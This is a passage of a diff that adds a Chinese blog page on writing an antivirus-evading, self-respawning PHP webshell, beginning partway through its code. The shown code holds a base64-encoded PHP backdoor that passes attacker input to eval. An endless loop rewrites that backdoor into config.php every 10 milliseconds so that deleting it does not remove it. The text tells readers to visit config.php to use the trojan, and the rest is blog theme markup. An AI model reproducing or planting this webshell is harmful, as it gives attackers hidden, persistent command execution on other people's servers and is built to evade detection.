class="hljs-string">&#x27;tPmNvbW1hbmQgPSAkY21kOwogICAgICAgJHRoaXMtPnNlcmlsID0gbmV3IGNsZWFuU3RyKCR0aGlzLT5jb21tYW5kKTsKICAgICAgICR0aGlzLT5maW5hbENtZCA9IHN1YnN0cihzZXJpYWxpemUoJHRoaXMtPnNlcmlsKSwzOSw2KS4iKCciLnN1YnN0cihzZXJpYWxpemUoJHRoaXMtPnNlcmlsKSw2NyxzdHJsZW4oJHRoaXMtPmNvbW1hbmQpKS4iJykiOwogICAgIH0KCiAgICAgZnVuY3Rpb24gZXZhbENtZCgpewogICAgICAgZXZhbCgkdGhpcy0+ZmluYWxDbWQuIjsiKTsKICAgICB9CiAgfQogIAogICRjbWRIYW5kbGVyID0gc3RhcnRDbWQoJGNtZCk7CiAgJG5vbmVNZWFuID0gY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoJGNtZEhhbmRsZXIsJ2V2YWxDbWQnKSxhcnJheSgpKTsKfWVsc2UgewogIGV4aXQoKTsKfQo/Pg==&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>  &#125;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;config.php&quot;</span>, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;retStr&#x27;</span>,<span class="hljs-keyword">array</span>())));<br>      <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>访问config.php就可以正常使用了。效果截图：</p>
+<p>busi.php不断生成config.php（真正的木马）。</p>
+<img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/1.png" srcset="/img/loading.gif" lazyload alt="">
+
+<img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/2.png" srcset="/img/loading.gif" lazyload alt="">
+
+<img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/3.png" srcset="/img/loading.gif" lazyload alt="">
+
+<img title="" src="https://white9ashpic.oss-cn-chengdu.aliyuncs.com/img/4.png" srcset="/img/loading.gif" lazyload alt="">
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>思路受益于deelmind。就写一点php木马也并非广而熟知的“免杀”，免杀领域是一门大学问。真正学习免杀的方法并不应该这样盲目的尝试，随着检测技术和对抗技术的发展，免杀领域会越来越高深。上到人工智能、深度学习，下至逆向分析、二进制。总之，要学习的东西还有很多。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/">#免杀</a>
+      
+        <a href="/tags/php/">#php</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>简单的php一句话免杀不死马编写</div>
+      <div>http://white9ash.fun/2022/11/02/简单的php一句话免杀不死马编写/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>white9ash</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%80%86%E5%90%91%E8%80%83%E8%AF%95%E9%A2%98%E5%88%86%E6%9E%90/" title="记一次简单的逆向考试题分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">记一次简单的逆向考试题分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"jqNMM9ep1H0gxulGGsP0rY3r-MdYXbMMI","appKey":"OUD3nHH8v5VFsz465lcPwcEW","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
